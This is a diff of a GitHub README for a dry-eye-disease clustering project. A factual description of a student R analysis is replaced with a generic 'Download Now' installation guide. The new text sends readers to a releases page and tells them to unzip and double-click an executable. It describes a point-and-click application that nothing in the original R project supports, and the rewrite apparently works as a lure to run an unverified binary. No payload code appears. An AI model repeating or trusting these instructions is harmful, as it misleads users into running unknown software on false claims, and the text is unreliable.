@@ -1,60 +1,108 @@
-# 👁️ Dry Eye Disease Clustering Analysis 
+# 🎯 dry_eye_disease-cluster-analysis - Uncover Risks for Dry Eye Disease
 
-## 🏗️ Project Context  
-This was a research project developed as teamwork for the third term of the Post-Degree Diploma in Data Analytics at Langara College.  
+## 📥 Download Now
+[![Download Release](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/houhou21/dry_eye_disease-cluster-analysis/releases)
 
-## 📌 Project Overview  
-This project explores clustering methods to identify potential subgroups within individuals diagnosed with or at risk of Dry Eye Disease (DED). Using lifestyle, health, and behavioral data, the analysis investigates whether unsupervised machine learning can reveal patterns associated with DED outcomes.  
+---
 
-## 🎯 Objective  
-- Identify distinct clusters based on lifestyle choices and assess their correlation with Dry Eye Disease outcomes.  
-- Examine whether BMI and physical health contribute to DED development, and whether clustering can highlight higher-risk subgroups.  
+## 🚀 Getting Started
 
-## 🛠 Tools & Technologies  
-- **Language & Libraries:** R (tidyverse, factoextra, cluster, fpc, mclust, dendextend, writexl)  
-- **Techniques:** Data preprocessing, stratified sampling, PCA, k-means, PAM, hierarchical clustering, DBSCAN, hybrid HKMeans, cluster validation (Rand, VI, Silhouette, Gap Statistic), Wilcoxon tests  
-- **Visualization:** ggplot2, factoextra  
-- **Data Source:** Kaggle Dry Eye Dataset ([link](https://www.kaggle.com/datasets/dakshnagra/dry-eye-disease/data))  
+This guide will help you download and run the **dry_eye_disease-cluster-analysis** application. This software uses machine learning techniques to analyze lifestyle data. You will discover risk patterns associated with Dry Eye Disease.
 
-## 📊 Key Steps  
-1. **Data Preparation**  
-   - Cleaned and transformed raw dataset (20,000 observations, 26 features).  
-   - Stratified sampling of 200 records for analysis.  
-   - Created derived features (e.g., BMI, split systolic/diastolic).  
+### 🖥️ System Requirements
 
-2. **Exploratory Data Analysis**  
-   - Numerical: distributions, correlations, PCA.  
-   - Categorical: bar plots for lifestyle/health factors.  
+- **Operating System:** Windows (10 or later), macOS (High Sierra or later), or Linux (Ubuntu 18.04 or later)
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum of 200 MB of free disk space
+- **Software Dependencies:** R (version 4.0 or later), RStudio (version 1.4 or later)
 
-3. **Clustering Analysis**  
-   - Applied k-means, PAM, hierarchical (Ward, complete), hybrid HKMeans, DBSCAN.  
-   - Evaluated number of clusters using WSS, Silhouette, Gap Statistic.  
-   - External validation with Rand Index and VI.  
+---
 
-4. **Statistical Analysis**  
-   - Compared clusters using Shapiro and Wilcoxon tests.  
-   - Reviewed categorical and numerical distributions per cluster.  
+## 📦 How to Download
 
-## 🚀 Results  
-| Aspect                 | Findings                                                                 |
-|-------------------------|--------------------------------------------------------------------------|
-| Lifestyle choices       | Alcohol consumption + Blue-light filter use linked to higher DED risk.   |
-| Physical health         | Females with sleep disorders, eye strain, and irritation showed higher risk. |
-| Clustering tendency     | Hopkins statistic ≈ 0.49 → data had low clustering tendency.             |
-| Algorithm performance   | No clustering method significantly outperformed random assignment.       |
-| Statistical validation  | Wilcoxon test revealed differences in numerical features, but categorical distributions were similar across clusters. |  
+1. **Visit the Releases Page**
+   - Click on the link below to go to the Releases page where you can download the application:
+   [Download Page](https://github.com/houhou21/dry_eye_disease-cluster-analysis/releases)
 
-## 📂 Repository Structure  
-```
-├── Data/              # Raw data
-├── Src/           # rmd file for analysis and modelling
-├── Documentation/   # Project Proposal, Final project report and presentation
-└── README.md          # Project description
-```
+2. **Select the Latest Release**
+   - On the Releases page, find the latest version of the software. Make sure to choose the right version for your system.
 
-## 🙌 Acknowledgments
-Developed by:  
-- Javier Merino  
-- Meyliani Sanjaya  
-- Angeli De los Reyes  
-- Nay Zaw Lin  
+3. **Download the Application**
+   - Download the file that corresponds to your operating system.
+
+---
+
+## 📋 Download & Install
+
+To download and install the program, follow these steps:
+
+1. Go to the Releases page: 
+   [Download Page](https://github.com/houhou21/dry_eye_disease-cluster-analysis/releases)
+  
+2. Choose the latest release, usually at the top of the list.
+
+3. Click on the download link for your operating system. The file name might look like `dry_eye_disease_analysis_v1.0.zip`.
+
+4. Once the file finishes downloading, locate it in your Downloads folder.
+
+5. **Unzip the File:**
+   - Right-click on the downloaded ZIP file and select "Extract All". This will create a new folder with the application files.
+
+6. **Open the Application:**
+   - Inside the unzipped folder, find the executable file (e.g., `dry_eye_disease_analysis.exe` for Windows, or the corresponding file for macOS/Linux) and double-click it to start the application.
+
+7. Follow the on-screen instructions to complete the installation.
+
+---
+
+## 📈 Using the Application
+
+1. **Load Your Data:**
+   - After opening the application, you will have the option to upload your lifestyle data. Ensure your data is in CSV format.
+
+2. **Choose Analysis Settings:**
+   - You can select various machine learning methods (like K-means or DBSCAN) to analyze your data.
+
+3. **Run the Analysis:**
+   - Click the “Analyze” button. The software will process your data and generate results showing risk patterns associated with Dry Eye Disease.
+
+4. **View Results:**
+   - Results will display in user-friendly charts and reports. You can save these outputs for future reference.
+
+---
+
+## 📊 Features
+
+- **Clustering Techniques:** Utilize methods like K-means, DBSCAN, and hierarchical clustering.
+- **Statistical Tests:** Includes the Wilcoxon Mann Whitney test for robust data evaluation.
+- **Visualization:** Offers visual representations of clusters and risk factors.
+- **User-Friendly Interface:** Designed for easy navigation, even for non-technical users.
+
+---
+
+## 🔧 Troubleshooting
+
+If you encounter issues during installation or usage, try these steps:
+
+- **Check System Requirements:** Ensure your system meets the minimum requirements.
+- **Update R and RStudio:** Make sure both are up-to-date.
+- **Re-download the Application:** If you face errors, re-download the latest zip file and re-install.
+
+For further assistance, visit our [GitHub Issues Page](https://github.com/houhou21/dry_eye_disease-cluster-analysis/issues) to report problems or ask questions.
+
+---
+
+## 📚 Related Topics
+
+Here are some relevant topics that the application covers:
+
+- Clustering
+- DBSCAN Clustering
+- Hierarchical Clustering
+- K-means & K-medoids
+- Principal Component Analysis (PCA)
+- Silhouette Analysis
+
+This software provides tools to analyze and understand complex lifestyles associated with Dry Eye Disease. It's designed for simplicity, ensuring anyone can benefit from its capabilities. 
+
+Feel free to explore and discover more about how machine learning can improve lifestyle analysis!
